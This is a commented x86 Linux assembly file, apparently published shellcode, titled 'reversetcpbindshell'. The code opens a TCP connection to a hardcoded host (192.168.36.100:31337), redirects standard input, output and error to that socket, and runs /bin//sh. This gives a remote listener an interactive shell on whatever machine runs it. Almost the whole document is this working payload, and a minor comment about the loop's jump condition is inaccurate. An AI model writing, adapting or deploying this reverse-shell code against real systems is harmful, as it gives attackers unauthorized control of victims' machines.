
;Title   : reversetcpbindshell  (92 bytes)
;Date    : 16 May 2013
;Author  : Russell Willis <codinguy@gmail.com>
;Comments: Matteo Malvica
;Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)
 
global _start			
 
section .text
_start:

; int socketcall(int call, unsigned long *args);
; sockfd = socket(int socket_family, int socket_type, int protocol);
;
xor    eax,eax ;house cleaning
xor    ebx,ebx
xor    ecx,ecx
xor    edx,edx
mov    al,0x66 ;syscall: sys_socketcall 
mov    bl,0x1  ;sys_socket (0x1) 
push   ecx  
push   0x6     ;IPPROTO_TCP=6
push   0x1	   ;socket_type=SOCK_STREAM (0x1)
push   0x2 	   ;socket_family=AF_INET (0x2)
mov    ecx,esp ;save stack pointer to socket() args
int    0x80

; int socketcall(int call, unsigned long *args);
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
mov    esi,eax
mov    al,0x66

;struct sockaddr_in {
;  __kernel_sa_family_t  sin_family;     /* Address family               */
;  __be16                sin_port;       /* Port number                  */
;  struct in_addr        sin_addr;       /* Internet address             */
;};
xor    ebx,ebx
mov    bl,0x2  	 ;sin_family=AF_INET (0x2)
push   0x6424a8c0;sin_addr=192.168.36.100 (network byte order endianness)
push   word  0x697a    ;sin_port=31337 (network byte endianness)
push   bx
inc    bl		 ;02 to bl
mov    ecx,esp   ;save stack pointer to sockaddr struct
push   0x10	     ;addrlen=16
push   ecx		 ;pointer to sockaddr
push   esi		 ;sockfd
mov    ecx,esp	 ;save pointer to sockaddr_in struct
int    0x80      ;exec sys_connect 

xor    ecx,ecx   
mov    cl,0x2    ;set loop-counter
loop:
	mov    al,0x3f  ;syscall: sys_dup2 
	int    0x80     ;exec sys_dup2
	dec    cl       ; decrement counter
	jns    loop  ;jump to loop label if ZF is not equal to 0 (controlled by decrementing cl)

;execve
xor    eax,eax
push   edx			 ; NULL terminating
push   0x68732f6e	 ;"hs//"
push   0x69622f2f	 ;"nib/"
mov    ebx,esp		 ;save pointer to filename
push   edx           ;null push the stack
push   ebx			 ;push pointer to filename
mov    ecx,esp       ;save stack pointer to ecx
push   edx           ;push null to stack
mov    edx,esp       ;save  stack pointer to edx
mov    al,0xb		 ; syscall: sys_execve
int    0x80			 ; exec sys_execve




